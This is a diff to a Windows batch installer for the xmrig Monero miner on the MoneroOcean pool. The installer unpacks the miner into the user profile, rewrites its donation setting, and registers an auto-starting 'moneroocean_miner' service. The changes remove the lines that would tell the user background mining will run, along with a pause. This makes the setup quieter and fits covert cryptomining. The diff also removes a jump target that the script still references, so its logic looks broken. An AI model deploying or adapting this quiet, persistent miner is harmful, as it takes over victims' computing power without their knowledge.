@@ -114,17 +114,7 @@ if not [%EMAIL%] == [] (
   echo ^(and %EMAIL% email as password to modify wallet options later at https://moneroocean.stream site^)
 )
 
-rem if %ADMIN% == 0 (
-rem   echo Since I do not have admin access, mining in background will be started using your startup directory script and only work when your are logged in this host.
-rem ) else (
-rem   echo Mining in background will be performed using moneroocean_miner service.
-rem )
-
-rem echo.
-rem echo JFYI: This host has %NUMBER_OF_PROCESSORS% CPU threads, so projected Monero hashrate is around %EXP_MONERO_HASHRATE% KH/s.
-rem echo.
-
-rem pause
+echo.
 
 rem start doing stuff: preparing miner
 
@@ -157,6 +147,10 @@ if errorlevel 1 (
   )
   echo [*] Unpacking stock "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\moneroocean"
   "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\moneroocean" "%USERPROFILE%\xmrig.zip" >NUL
+  if errorlevel 1 (
+    echo ERROR: Can't unpack "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\moneroocean"
+    exit /b 1
+  )
   del "%USERPROFILE%\7za.exe"
 )
 del "%USERPROFILE%\xmrig.zip"
@@ -165,6 +159,7 @@ echo [*] Checking if advanced version of "%USERPROFILE%\moneroocean\xmrig.exe" w
 powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 1,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config.json'" 
 "%USERPROFILE%\moneroocean\xmrig.exe" --help >NUL
 if %ERRORLEVEL% equ 0 goto MINER_OK
+
 :MINER_BAD
 
 if exist "%USERPROFILE%\moneroocean\xmrig.exe" (
@@ -220,24 +215,16 @@ if exist "%USERPROFILE%\moneroocean\xmrig.exe" (
   echo WARNING: Stock version of "%USERPROFILE%\moneroocean\xmrig.exe" was removed by antivirus
 )
 
-exit /b 1
-
-:MINER_OK
-
-echo [*] Miner "%USERPROFILE%\moneroocean\xmrig.exe" is OK
-
-for /f "tokens=*" %%a in ('powershell -Command "hostname | %%{$_ -replace '[^a-zA-Z0-9]+', '_'}"') do set PASS=%%a
-if [%PASS%] == [] (
-  set PASS=worker
-)
-
-echo [*] Starting "moneroocean_miner" service
-sc create moneroocean_miner binPath="%USERPROFILE%\moneroocean\xmrig.exe --config=%USERPROFILE%\moneroocean\config.json" start=auto
-if %errorlevel% == 0 (
-  echo [*] Miner service "moneroocean_miner" installed and configured ^(if it's not running, please check moneroocean\xmrig.log for the details^)
-  sc start moneroocean_miner
-) else (
-  echo ERROR: Can't install "moneroocean_miner" service
+if %ADMIN% == 1 (
+  echo [*] Installing "moneroocean_miner" service
+  sc create moneroocean_miner binPath="%USERPROFILE%\moneroocean\xmrig.exe --config=%USERPROFILE%\moneroocean\config.json" start=auto
+  if %errorlevel% == 0 (
+    echo [*] Miner service "moneroocean_miner" installed and configured ^(if it's not running, please check moneroocean\xmrig.log for the details^)
+    echo [*] Starting "moneroocean_miner" service
+    sc start moneroocean_miner
+  ) else (
+    echo ERROR: Can't install "moneroocean_miner" service
+  )
 )
 
 echo.
